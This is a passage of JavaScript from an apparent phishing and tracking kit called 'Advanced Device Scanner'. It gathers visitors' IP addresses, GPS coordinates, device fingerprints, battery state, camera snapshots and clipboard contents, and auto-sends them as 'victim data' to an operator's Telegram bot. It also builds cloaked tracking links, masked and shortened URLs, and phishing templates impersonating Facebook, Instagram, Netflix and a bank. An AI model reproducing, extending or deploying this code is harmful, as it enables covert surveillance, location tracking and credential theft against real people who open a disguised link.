                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                deviceData.cameraInfo = {
                    available: videoDevices.length > 0,
                    count: videoDevices.length,
                    devices: videoDevices.map(d => d.label || 'Unknown camera')
                };
                
            } catch (e) {
                deviceData.cameraInfo = {
                    available: false,
                    error: e.message
                };
            }
        }

        // ============================================
        // UI UPDATE FUNCTIONS
        // ============================================
        
        function updateDeviceInfoUI() {
            const elements = {
                'platform-info': deviceData.deviceInfo.platform,
                'user-agent': deviceData.deviceInfo.userAgent,
                'screen-resolution': deviceData.deviceInfo.screenResolution,
                'device-memory': deviceData.deviceInfo.deviceMemory || 'Unknown',
                'device-language': deviceData.deviceInfo.language,
                'device-timezone': deviceData.deviceInfo.timezone,
                'cpu-cores': deviceData.deviceInfo.hardwareConcurrency,
                'touch-support': deviceData.deviceInfo.touchSupport ? 'Yes' : 'No',
                'color-depth': deviceData.deviceInfo.colorDepth,
                'pixel-ratio': deviceData.deviceInfo.pixelRatio
            };
            
            for (const [id, value] of Object.entries(elements)) {
                const element = document.getElementById(id);
                if (element) element.textContent = value;
            }
        }
        
        function updateMobileFeaturesUI() {
            const platformDiv = document.getElementById('platform-detection');
            if (platformDiv) {
                const info = deviceData.mobileFeatures.platformInfo;
                platformDiv.innerHTML = `
                    <div class="mobile-data-item">
                        <span>Platform:</span>
                        <span>${info.platform}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>Device Type:</span>
                        <span>${info.isMobile ? 'Mobile' : 'Desktop'}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>OS:</span>
                        <span>${info.isIOS ? 'iOS' : info.isAndroid ? 'Android' : 'Other'}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>Browser:</span>
                        <span>${info.isChrome ? 'Chrome' : info.isSafari ? 'Safari' : 'Other'}</span>
                    </div>
                `;
            }
            
            const capabilitiesDiv = document.getElementById('device-capabilities');
            if (capabilitiesDiv) {
                const caps = deviceData.mobileFeatures.capabilities;
                capabilitiesDiv.innerHTML = `
                    <div class="mobile-data-item">
                        <span>Vibration:</span>
                        <span>${caps.hasVibration ? '✅' : '❌'}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>NFC:</span>
                        <span>${caps.hasNFC ? '✅' : '❌'}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>Bluetooth:</span>
                        <span>${caps.hasBluetooth ? '✅' : '❌'}</span>
                    </div>
                    <div class="mobile-data-item">
                        <span>Touch Points:</span>
                        <span>${caps.maxTouchPoints}</span>
                    </div>
                `;
            }
        }
        
        function updateNetworkInfoUI() {
            const elements = {
                'ipv4-address': deviceData.networkInfo.ipv4 || 'Loading...',
                'ipv6-address': deviceData.networkInfo.ipv6 || 'Loading...',
                'connection-type': deviceData.networkInfo.connectionType || 'Checking...',
                'data-saver': deviceData.networkInfo.saveData ? 'Enabled' : 'Disabled',
                'online-status': deviceData.networkInfo.onlineStatus || 'Checking...',
                'network-bandwidth': deviceData.networkInfo.downlink ? `${deviceData.networkInfo.downlink} Mbps` : 'Checking...',
                'effective-connection': deviceData.networkInfo.connectionType || 'Checking...',
                'network-rtt': deviceData.networkInfo.rtt ? `${deviceData.networkInfo.rtt} ms` : 'Checking...'
            };
            
            for (const [id, value] of Object.entries(elements)) {
                const element = document.getElementById(id);
                if (element) element.textContent = value;
            }
        }
        
        function updateFingerprintUI() {
            const elements = {
                'canvas-fingerprint': deviceData.fingerprintInfo.canvas ? deviceData.fingerprintInfo.canvas.substring(0, 16) + '...' : 'Generating...',
                'screen-fingerprint': deviceData.fingerprintInfo.screen ? deviceData.fingerprintInfo.screen.substring(0, 16) + '...' : 'Generating...',
                'timezone-fingerprint': deviceData.fingerprintInfo.timezone || 'Loading...',
                'full-fingerprint': deviceData.fingerprintInfo.full || 'Generating...'
            };
            
            for (const [id, value] of Object.entries(elements)) {
                const element = document.getElementById(id);
                if (element) element.textContent = value;
            }
        }
        
        function updatePermissionsUI() {
            const container = document.getElementById('permissions-container');
            if (!container || !deviceData.permissionsInfo) return;
            
            container.innerHTML = '';
            
            for (const [permission, status] of Object.entries(deviceData.permissionsInfo)) {
                const col = document.createElement('div');
                col.className = 'col-md-6 col-lg-4 mb-3';
                
                let badgeClass = 'bg-secondary';
                if (status === 'granted') badgeClass = 'bg-success';
                else if (status === 'denied') badgeClass = 'bg-danger';
                else if (status === 'prompt') badgeClass = 'bg-warning';
                
                col.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center p-2 border rounded">
                        <span><i class="fas fa-shield-alt me-2"></i>${permission}</span>
                        <span class="badge ${badgeClass}">${status}</span>
                    </div>
                `;
                
                container.appendChild(col);
            }
        }
        
        function updateBatteryUI() {
            if (!deviceData.batteryInfo) return;
            
            const batteryLevelBar = document.getElementById('battery-level-bar');
            const batteryLevelText = document.getElementById('battery-level-text');
            const batteryStatusText = document.getElementById('battery-status-text');
            const chargingStatus = document.getElementById('charging-status');
            const batteryOverview = document.getElementById('battery-overview');
            
            if (batteryLevelBar && deviceData.batteryInfo.level !== undefined) {
                batteryLevelBar.style.width = `${deviceData.batteryInfo.level}%`;
                batteryLevelBar.setAttribute('aria-valuenow', deviceData.batteryInfo.level);
            }
            
            if (batteryLevelText) {
                batteryLevelText.textContent = `${deviceData.batteryInfo.level}%`;
            }
            
            if (batteryStatusText) {
                batteryStatusText.textContent = `Battery Status: ${deviceData.batteryInfo.level}% - ${deviceData.batteryInfo.charging ? 'Charging' : 'Not Charging'}`;
            }
            
            if (chargingStatus) {
                chargingStatus.textContent = deviceData.batteryInfo.charging ? 'Charging' : 'Not Charging';
            }
            
            if (batteryOverview) {
                batteryOverview.textContent = `${deviceData.batteryInfo.level}%`;
            }
        }
        
        function updateStorageUI() {
            if (!deviceData.storageInfo) return;
            
            const elements = {
                'storage-quota': deviceData.storageInfo.quota ? `${deviceData.storageInfo.quota} MB` : 'Checking...',
                'storage-usage': deviceData.storageInfo.usage ? `${deviceData.storageInfo.usage} MB` : 'Checking...',
                'storage-available': deviceData.storageInfo.available ? `${deviceData.storageInfo.available} MB` : 'Checking...',
                'storage-persistence': deviceData.storageInfo.persistence || 'Checking...'
            };
            
            for (const [id, value] of Object.entries(elements)) {
                const element = document.getElementById(id);
                if (element) element.textContent = value;
            }
        }
        
        function updateLocationUI() {
            if (!deviceData.locationInfo) return;
            
            const elements = {
                'latitude': deviceData.locationInfo.latitude ? deviceData.locationInfo.latitude.toFixed(6) : 'Not retrieved',
                'longitude': deviceData.locationInfo.longitude ? deviceData.locationInfo.longitude.toFixed(6) : 'Not retrieved',
                'location-accuracy': deviceData.locationInfo.accuracy ? `${deviceData.locationInfo.accuracy.toFixed(2)} meters` : 'Not retrieved',
                'altitude': deviceData.locationInfo.altitude ? `${deviceData.locationInfo.altitude.toFixed(2)} meters` : 'Not available',
                'speed': deviceData.locationInfo.speed ? `${(deviceData.locationInfo.speed * 3.6).toFixed(2)} km/h` : 'Not available',
                'location-timestamp': deviceData.locationInfo.timestamp ? new Date(deviceData.locationInfo.timestamp).toLocaleString() : 'Not retrieved'
            };
            
            for (const [id, value] of Object.entries(elements)) {
                const element = document.getElementById(id);
                if (element) element.textContent = value;
            }
            
            const mapElement = document.getElementById('location-map');
            if (mapElement && deviceData.locationInfo.latitude) {
                mapElement.innerHTML = `
                    <div class="d-flex align-items-center justify-content-center h-100">
                        <div class="text-center">
                            <i class="fas fa-map-marked-alt fa-3x text-primary mb-3"></i>
                            <h5>Location Retrieved</h5>
                            <p class="small">Lat: ${deviceData.locationInfo.latitude.toFixed(6)}</p>
                            <p class="small">Lon: ${deviceData.locationInfo.longitude.toFixed(6)}</p>
                            <p class="small">Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters</p>
                            <a href="https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}" 
                               target="_blank" class="btn btn-sm btn-primary">
                                <i class="fas fa-external-link-alt"></i> Open in Google Maps
                            </a>
                        </div>
                    </div>
                `;
            }
        }

        // ============================================
        // TELEGRAM FUNCTIONS
        // ============================================
        
        function saveTelegramConfig() {
            const botTokenInput = document.getElementById('bot-token');
            const chatIdInput = document.getElementById('chat-id');
            
            if (botTokenInput && chatIdInput) {
                telegramConfig.botToken = botTokenInput.value.trim();
                telegramConfig.chatId = chatIdInput.value.trim();
                
                campaignManager.saveToStorage();
                showToast('Telegram configuration saved!', 'success');
            }
        }
        
        async function sendToTelegram() {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure Telegram bot first!', 'error');
                return;
            }
            
            try {
                showToast('Sending data to Telegram...', 'info');
                
                let message = `📱 *Device Information Report*\n\n`;
                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
                message += `🆔 *Victim ID:* ${deviceData.victimID || 'Not set'}\n\n`;
                
                message += `*Device Information:*\n`;
                message += `• Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `• Screen: ${deviceData.deviceInfo.screenResolution || 'Unknown'}\n`;
                message += `• Language: ${deviceData.deviceInfo.language || 'Unknown'}\n`;
                message += `• Timezone: ${deviceData.deviceInfo.timezone || 'Unknown'}\n`;
                message += `• User Agent: ${deviceData.deviceInfo.userAgent?.substring(0, 50) || 'Unknown'}...\n\n`;
                
                if (deviceData.networkInfo?.ipv4) {
                    message += `*Network Information:*\n`;
                    message += `• IP Address: \`${deviceData.networkInfo.ipv4}\`\n`;
                    message += `• Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                    if (deviceData.networkInfo.ipv6 && deviceData.networkInfo.ipv6 !== 'Not available') {
                        message += `• IPv6: \`${deviceData.networkInfo.ipv6}\`\n`;
                    }
                    message += `\n`;
                }
                
                if (deviceData.locationInfo && deviceData.locationInfo.latitude) {
                    message += `*Location Information:*\n`;
                    message += `• Latitude: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
                    message += `• Longitude: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                    message += `• Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
                    message += `• Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n\n`;
                }
                
                if (deviceData.batteryInfo) {
                    message += `*Battery Information:*\n`;
                    message += `• Level: ${deviceData.batteryInfo.level || 'Unknown'}%\n`;
                    message += `• Charging: ${deviceData.batteryInfo.charging ? 'Yes' : 'No'}\n\n`;
                }
                
                if (deviceData.fingerprintInfo?.full) {
                    message += `*Device Fingerprint:*\n`;
                    message += `• Hash: \`${deviceData.fingerprintInfo.full.substring(0, 32)}...\`\n\n`;
                }
                
                if (deviceData.mobileFeatures.platformInfo.isMobile) {
                    message += `*Mobile Features:*\n`;
                    message += `• Type: ${deviceData.mobileFeatures.platformInfo.isIOS ? 'iOS' : 'Android'}\n`;
                    message += `• Browser: ${deviceData.mobileFeatures.platformInfo.isChrome ? 'Chrome Mobile' : 'Safari Mobile'}\n`;
                    if (deviceData.mobileFeatures.capabilities.hasVibration) {
                        message += `• Vibration: ✅ Available\n`;
                    }
                    message += `\n`;
                }
                
                message += `_Report generated via Advanced Device Scanner_`;
                
                await sendTelegramMessage(message);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Full Report',
                    success: true,
                    message: 'Data sent successfully'
                });
                
                campaignManager.saveToStorage();
                updateTelegramHistory();
                
                showToast('Data sent to Telegram successfully!', 'success');
                
            } catch (error) {
                console.error('Telegram send error:', error);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Full Report',
                    success: false,
                    message: `Error: ${error.message}`
                });
                
                campaignManager.saveToStorage();
                updateTelegramHistory();
                
                showToast(`Failed to send: ${error.message}`, 'error');
            }
        }
        
        async function sendVictimDataToTelegram(campaignId) {
            const campaign = campaignManager.getCampaign(campaignId);
            if (!campaign) return;
            
            try {
                let message = `🎯 *NEW VICTIM DATA CAPTURED!*\n\n`;
                message += `📊 *Campaign:* ${campaign.name}\n`;
                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
                message += `🆔 *Victim ID:* ${deviceData.victimID}\n`;
                message += `🔗 *Campaign ID:* ${campaignId}\n\n`;
                
                message += `*Device Information:*\n`;
                message += `• Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `• Screen: ${deviceData.deviceInfo.screenResolution || 'Unknown'}\n`;
                message += `• Browser: ${deviceData.deviceInfo.userAgent?.split(' ').slice(-2).join(' ') || 'Unknown'}\n\n`;
                
                if (deviceData.networkInfo?.ipv4) {
                    message += `*Network Information:*\n`;
                    message += `• IP Address: \`${deviceData.networkInfo.ipv4}\`\n`;
                    message += `• Connection: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                    if (deviceData.networkInfo.ipv6 && deviceData.networkInfo.ipv6 !== 'Not available') {
                        message += `• IPv6: \`${deviceData.networkInfo.ipv6}\`\n`;
                    }
                    message += `\n`;
                }
                
                if (deviceData.locationInfo && deviceData.locationInfo.latitude) {
                    message += `*Location Information:*\n`;
                    message += `• Coordinates: ${deviceData.locationInfo.latitude.toFixed(6)}, ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                    message += `• Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
                    message += `• Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n\n`;
                }
                
                if (deviceData.batteryInfo) {
                    message += `*Battery Status:*\n`;
                    message += `• Level: ${deviceData.batteryInfo.level || 'Unknown'}%\n`;
                    message += `• Charging: ${deviceData.batteryInfo.charging ? 'Yes' : 'No'}\n\n`;
                }
                
                if (deviceData.fingerprintInfo?.full) {
                    message += `*Device Fingerprint:*\n`;
                    message += `• Hash: \`${deviceData.fingerprintInfo.full.substring(0, 24)}...\`\n\n`;
                }
                
                if (deviceData.socialInfo && Object.keys(deviceData.socialInfo).length > 0) {
                    message += `*Social Detection:*\n`;
                    const socialApps = Object.keys(deviceData.socialInfo).filter(key => deviceData.socialInfo[key] === true);
                    if (socialApps.length > 0) {
                        message += `• Apps: ${socialApps.join(', ')}\n`;
                    }
                    message += `\n`;
                }
                
                message += `_Data automatically collected via tracking link_\n`;
                message += `Session ID: ${deviceData.sessionID.substring(0, 12)}...`;
                
                await sendTelegramMessage(message);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Victim Data',
                    success: true,
                    campaign: campaign.name,
                    victimId: deviceData.victimID
                });
                
                telegramConfig.lastSendTime = Date.now();
                campaignManager.saveToStorage();
                updateTelegramHistory();
                
                console.log('Victim data sent to Telegram successfully');
                
            } catch (error) {
                console.error('Failed to send victim data:', error);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Victim Data',
                    success: false,
                    error: error.message,
                    retry: deviceData.dataSendAttempts
                });
                
                campaignManager.saveToStorage();
                updateTelegramHistory();
                
                if (deviceData.dataSendAttempts < telegramConfig.maxRetries) {
                    deviceData.dataSendAttempts++;
                    setTimeout(() => sendVictimDataToTelegram(campaignId), 3000);
                }
            }
        }
        
        async function sendTelegramMessage(text) {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                throw new Error('Telegram bot not configured');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramConfig.chatId,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Telegram API error');
            }
            
            return data;
        }
        
        function testTelegramConnection() {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                showToast('Please configure Telegram bot first!', 'error');
                return;
            }
            
            showToast('Testing Telegram connection...', 'info');
            
            sendTelegramMessage('✅ Device Scanner Test\nConnection successful!')
                .then(() => {
                    showToast('✅ Connected to Telegram successfully!', 'success');
                    
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Test',
                        success: true,
                        message: 'Connection test successful'
                    });
                    
                    campaignManager.saveToStorage();
                    updateTelegramHistory();
                    
                })
                .catch(error => {
                    showToast(`❌ Connection failed: ${error.message}`, 'error');
                    
                    telegramConfig.sendHistory.push({
                        timestamp: new Date().toISOString(),
                        type: 'Test',
                        success: false,
                        message: `Error: ${error.message}`
                    });
                    
                    campaignManager.saveToStorage();
                    updateTelegramHistory();
                });
        }
        
        function updateTelegramHistory() {
            const historyContainer = document.getElementById('telegram-history');
            if (!historyContainer) return;
            
            if (telegramConfig.sendHistory.length === 0) {
                historyContainer.innerHTML = '<p class="text-muted">No send history yet.</p>';
                return;
            }
            
            let html = '';
            telegramConfig.sendHistory.slice(-5).reverse().forEach(item => {
                const time = new Date(item.timestamp).toLocaleTimeString();
                const status = item.success ? '✅' : '❌';
                html += `
                    <div class="border-bottom pb-2 mb-2">
                        <div class="d-flex justify-content-between">
                            <span>${status} ${item.type}</span>
                            <span class="text-muted">${time}</span>
                        </div>
                        <small class="text-muted">${item.message}</small>
                    </div>
                `;
            });
            
            historyContainer.innerHTML = html;
        }

        // ============================================
        // LINK GENERATOR FUNCTIONS
        // ============================================
        
        function generateTrackingLink() {
            const campaignName = document.getElementById('campaign-name').value.trim() || 'Test Campaign';
            const redirectUrl = document.getElementById('redirect-url').value.trim() || 'https://google.com';
            const cloakUrl = document.getElementById('cloak-url').value.trim() || 'https://free-gifts.com';
            const cloakTitle = document.getElementById('cloak-title').value.trim() || 'Secure Page';
            
            const settings = {
                collectBasic: document.getElementById('collect-basic').checked,
                collectLocation: document.getElementById('collect-location').checked,
                collectCamera: document.getElementById('collect-camera').checked,
                collectNetwork: document.getElementById('collect-network').checked,
                collectBattery: document.getElementById('collect-battery').checked,
                collectClipboard: document.getElementById('collect-clipboard').checked,
                autoTelegram: document.getElementById('auto-telegram').checked,
                redirectUrl: redirectUrl,
                cloakUrl: cloakUrl,
                cloakTitle: cloakTitle
            };
            
            const campaignId = SecurityLayer.generateSecureID();
            
            const currentUrl = window.location.origin + window.location.pathname;
            const params = new URLSearchParams();
            params.set('track', 'true');
            params.set('cid', campaignId);
            params.set('ref', SecurityLayer.encrypt(redirectUrl));
            params.set('title', SecurityLayer.encrypt(cloakTitle));
            params.set('v', '2');
            
            const trackingLink = `${currentUrl}?${params.toString()}`;
            
            const campaign = campaignManager.addCampaign(campaignName, trackingLink, settings);
            
            const linkContainer = document.getElementById('generated-link-preview');
            if (linkContainer) {
                linkContainer.innerHTML = `
                    <div class="generated-link-container">
                        <div class="d-flex justify-content-between align-items-center mb-2">
                            <div>
                                <strong>Generated Link:</strong>
                                <div class="auto-send-container">
                                    <i class="fas fa-paper-plane"></i> Auto-send: ${settings.autoTelegram ? '✅ Enabled' : '❌ Disabled'}
                                </div>
                            </div>
                            <div>
                                <button class="btn btn-sm btn-success" onclick="copyGeneratedLink()">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="link-display">
                            <code>${trackingLink}</code>
                        </div>
                        <div class="mt-2 small">
                            <strong>Campaign ID:</strong> ${campaignId}<br>
                            <strong>Features:</strong> ${Object.keys(settings).filter(k => settings[k] === true).join(', ')}
                        </div>
                        <div class="security-notice">
                            <i class="fas fa-shield-alt"></i> Data will be sent automatically when victim opens this link
                        </div>
                    </div>
                `;
            }
            
            const quickLinkPreview = document.getElementById('quick-link-preview');
            if (quickLinkPreview) {
                quickLinkPreview.innerHTML = `
                    <div class="generated-link-container">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <strong>Generated Link:</strong>
                            </div>
                            <div>
                                <button class="btn btn-sm btn-success" onclick="copyToClipboard('${trackingLink}')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="link-display mt-2">
                            <code>${trackingLink}</code>
                        </div>
                    </div>
                `;
            }
            
            updateCloakPreview();
            
            showToast(`✅ Tracking link generated! Auto-send: ${settings.autoTelegram ? 'ENABLED' : 'DISABLED'}`, 'success');
            
            return campaign;
        }
        
        function updateCloakPreview() {
            const cloakTitle = document.getElementById('cloak-title');
            const cloakUrl = document.getElementById('cloak-url');
            const preview = document.getElementById('cloak-preview');
            
            if (!cloakTitle || !cloakUrl || !preview) return;
            
            const title = cloakTitle.value || 'Secure Page';
            const url = cloakUrl.value || 'https://trusted-site.com';
            
            preview.innerHTML = `
                <h5>${title}</h5>
                <p>This page will be displayed at: <code>${url}</code></p>
                <div style="background: linear-gradient(45deg, #4A90E2, #357ABD); padding: 15px; border-radius: 8px; text-align: center; margin: 10px 0;">
                    <i class="fas fa-shield-alt fa-2x text-white mb-2"></i>
                    <h6 class="text-white">Secure Verification Page</h6>
                    <p class="small text-white-50 mb-0">Loading security scan...</p>
                </div>
                <p class="small">
                    <i class="fas fa-shield-alt"></i> This appears as a legitimate website to users while data is collected in the background.
                </p>
            `;
        }
        
        function generatePhishingTemplate(type) {
            const templates = {
                'facebook': {
                    name: 'Facebook Login',
                    redirect: 'https://facebook.com',
                    cloak: 'https://facebook-login-secure.com',
                    title: '🔐 Facebook Security Verification Required'
                },
                'instagram': {
                    name: 'Instagram Giveaway',
                    redirect: 'https://instagram.com',
                    cloak: 'https://instagram-free-gifts.com',
                    title: '🎁 Instagram iPhone Giveaway - Claim Now!'
                },
                'netflix': {
                    name: 'Netflix Free Trial',
                    redirect: 'https://netflix.com',
                    cloak: 'https://netflix-free-premium.com',
                    title: '🍿 Netflix Premium 6-Month Free Trial'
                },
                'banking': {
                    name: 'Banking Security',
                    redirect: 'https://bank.com',
                    cloak: 'https://secure-banking-update.com',
                    title: '🏦 Important: Security Update Required'
                }
            };
            
            const template = templates[type];
            if (template) {
                document.getElementById('campaign-name').value = template.name;
                document.getElementById('redirect-url').value = template.redirect;
                document.getElementById('cloak-url').value = template.cloak;
                document.getElementById('cloak-title').value = template.title;
                
                updateCloakPreview();
                showToast(`Loaded ${type} template`, 'success');
            }
        }
        
        function generateQuickLink() {
            const linkType = document.getElementById('quick-link-type').value;
            const currentUrl = window.location.origin + window.location.pathname;
            
            let link = currentUrl;
            if (linkType === 'cloaked') {
                link += '?track=true&cid=quick_' + Date.now() + '&redirect=https://google.com&title=Secure%20Page';
            } else if (linkType === 'redirect') {
                link += '?track=true&cid=redirect_' + Date.now() + '&redirect=https://youtube.com';
            } else {
                link += '?track=true&cid=direct_' + Date.now();
            }
            
            const preview = document.getElementById('quick-link-preview');
            preview.innerHTML = `
                <div class="generated-link-container">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <strong>Quick Link:</strong>
                        </div>
                        <div>
                            <button class="btn btn-sm btn-success" onclick="copyToClipboard('${link}')">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>
                    </div>
                    <div class="link-display mt-2">
                        <code>${link}</code>
                    </div>
                </div>
            `;
            
            showToast('Quick link generated!', 'success');
        }
        
        function copyQuickLink() {
            const preview = document.getElementById('quick-link-preview');
            const codeElement = preview.querySelector('code');
            
            if (codeElement) {
                copyToClipboard(codeElement.textContent);
            } else {
                showToast('No link to copy', 'error');
            }
        }
        
        function copyGeneratedLink() {
            const preview = document.getElementById('generated-link-preview');
            const codeElement = preview.querySelector('code');
            
            if (codeElement) {
                copyToClipboard(codeElement.textContent);
                showToast('Link copied to clipboard!', 'success');
            } else {
                showToast('No link to copy', 'error');
            }
        }
        
        async function shortenLink() {
            const service = document.getElementById('shortener-service').value;
            const preview = document.getElementById('generated-link-preview');
            const codeElement = preview?.querySelector('code');
            
            if (!codeElement) {
                showToast('Generate a link first', 'error');
                return;
            }
            
            const originalLink = codeElement.textContent;
            showToast('Shortening link...', 'info');
            
            try {
                const shortenedLink = await campaignManager.shortenUrl(originalLink, service);
                
                document.getElementById('short-link-text').textContent = shortenedLink;
                document.getElementById('shortened-link').style.display = 'block';
                
                codeElement.textContent = shortenedLink;
                
                showToast('Link shortened successfully!', 'success');
                
            } catch (error) {
                console.error('Shortening error:', error);
                showToast('Link shortening service unavailable. Using direct link.', 'warning');
                
                const shortCode = Math.random().toString(36).substring(2, 8);
                const fallbackShort = `${window.location.origin}/s/${shortCode}`;
                document.getElementById('short-link-text').textContent = fallbackShort;
                document.getElementById('shortened-link').style.display = 'block';
            }
        }
        
        function copyShortLink() {
            const shortLinkText = document.getElementById('short-link-text');
            if (shortLinkText && shortLinkText.textContent) {
                copyToClipboard(shortLinkText.textContent);
                showToast('Shortened link copied!', 'success');
            } else {
                showToast('No shortened link available', 'error');
            }
        }

        // ============================================
        // CAMERA FUNCTIONS
        // ============================================
        
        async function initializeCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const frontCamera = document.getElementById('camera-feed');
                if (frontCamera) {
                    frontCamera.srcObject = stream;
                }
                
                showToast('Camera started successfully', 'success');
            } catch (error) {
                showToast('Failed to access camera: ' + error.message, 'error');
                console.error('Camera error:', error);
            }
        }
        
        function takeSnapshot() {
            const videoElement = document.getElementById('camera-feed');
            const canvas = document.getElementById('snapshot-canvas');
            const imgElement = document.getElementById('snapshot-img');
            
            if (videoElement && videoElement.srcObject) {
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                imgElement.src = dataURL;
                imgElement.style.display = 'block';
                
                deviceData.cameraInfo = {
                    snapshot: dataURL,
                    timestamp: new Date().toISOString()
                };
                
                showToast('Snapshot captured!', 'success');
            } else {
                showToast('Camera not available. Please start camera first.', 'error');
            }
        }

        // ============================================
        // OTHER TOOL FUNCTIONS
        // ============================================
        
        function readClipboard() {
            navigator.clipboard.readText().then(text => {
                document.getElementById('clipboard-content').value = text;
                deviceData.clipboardInfo = text;
                showToast('Clipboard content read successfully!', 'success');
            }).catch(err => {
                showToast('Failed to read clipboard. Make sure you have granted permission.', 'error');
            });
        }
        
        function generateMaskedURL() {
            const originalUrl = document.getElementById('original-url').value;
            const maskDomain = document.getElementById('mask-domain').value;
            
            if (!originalUrl) {
                showToast('Please enter a URL', 'error');
                return;
            }
            
            let finalMaskDomain = maskDomain;
            if (maskDomain === 'custom') {
                const customDomain = document.getElementById('custom-domain').value;
                if (!customDomain) {
                    showToast('Please enter a custom domain', 'error');
                    return;
                }
                finalMaskDomain = customDomain;
            }
            
            const randomPath = Math.random().toString(36).substring(2, 15);
            const maskedUrl = `${finalMaskDomain}/redirect/${randomPath}?url=${encodeURIComponent(originalUrl)}`;
            
            const container = document.getElementById('masked-url-container');
            container.textContent = maskedUrl;
            
            showToast('Masked URL generated!', 'success');
        }
        
        function copyMaskedURL() {
            const container = document.getElementById('masked-url-container');
            if (container && container.textContent !== 'Masked URL will appear here') {
                copyToClipboard(container.textContent);
                showToast('Masked URL copied to clipboard!', 'success');
            } else {
                showToast('No masked URL to copy', 'error');
            }
        }
        
        function requestAllPermissions() {
            const permissions = [
                {name: 'camera', label: 'Camera'},
                {name: 'microphone', label: 'Microphone'},
                {name: 'geolocation', label: 'Location'},
                {name: 'notifications', label: 'Notifications'}
            ];
            
            permissions.forEach(async (perm) => {
                try {
                    if (perm.name === 'geolocation') {
                        navigator.geolocation.getCurrentPosition(() => {
                            showToast(`${perm.label} permission granted`, 'success');
                        }, () => {
                            showToast(`${perm.label} permission denied`, 'error');
                        });
                    } else if (perm.name === 'notifications') {
                        const result = await Notification.requestPermission();
                        showToast(`Notifications: ${result}`, result === 'granted' ? 'success' : 'warning');
                    } else {
                        const stream = await navigator.mediaDevices.getUserMedia({[perm.name]: true});
                        showToast(`${perm.label} permission granted`, 'success');
                        stream.getTracks().forEach(track => track.stop());
                    }
                } catch (error) {
                    showToast(`Failed to request ${perm.label}: ${error.message}`, 'error');
                }
            });
        }
        
        function testSensors() {
            const results = document.getElementById('sensor-results');
            let html = '<div class="small">';
            
            if ('DeviceMotionEvent' in window) {
                html += '<div>✅ Accelerometer: Available</div>';
            } else {
                html += '<div>❌ Accelerometer: Not available</div>';
            }
            
            if ('DeviceOrientationEvent' in window) {
                html += '<div>✅ Orientation: Available</div>';
            } else {
                html += '<div>❌ Orientation: Not available</div>';
            }
            
            if ('vibrate' in navigator) {
                html += '<div>✅ Vibration: Available</div>';
                navigator.vibrate(100);
            } else {
                html += '<div>❌ Vibration: Not available</div>';
            }
            
            html += '</div>';
            results.innerHTML = html;
        }
        
        function detectInstalledApps() {
            const results = document.getElementById('app-results');
            const ua = navigator.userAgent.toLowerCase();
            let detectedApps = [];
            
            if (/whatsapp/i.test(ua)) detectedApps.push('WhatsApp');
            if (/instagram/i.test(ua)) detectedApps.push('Instagram');
            if (/fb|facebook/i.test(ua)) detectedApps.push('Facebook');
            
            let html = '<div class="small">';
            if (detectedApps.length > 0) {
                html += `<div>Detected: ${detectedApps.join(', ')}</div>`;
            } else {
                html += '<div>No apps detected via user agent</div>';
            }
            html += '</div>';
            
            results.innerHTML = html;
        }
        
        function showIPTab() {
            showTab('network-tab');
        }
        
        function showUserAgentTab() {
            showTab('device-tab');
        }
        
        function testScreen() {
            showToast('Screen tester would open in a new window', 'info');
        }
        
        function testNetwork() {
            showToast('Running network test...', 'info');
            
            setTimeout(() => {
                showToast('Network test completed! Download: 25 Mbps, Upload: 10 Mbps, Ping: 45ms', 'success');
            }, 2000);
        }
        
        function runNetworkTest() {
            testNetwork();
        }
        
        function checkSecurity() {
            let securityIssues = [];
            
            if (window.location.protocol !== 'https:') {
                securityIssues.push('Not using HTTPS');
            }
            
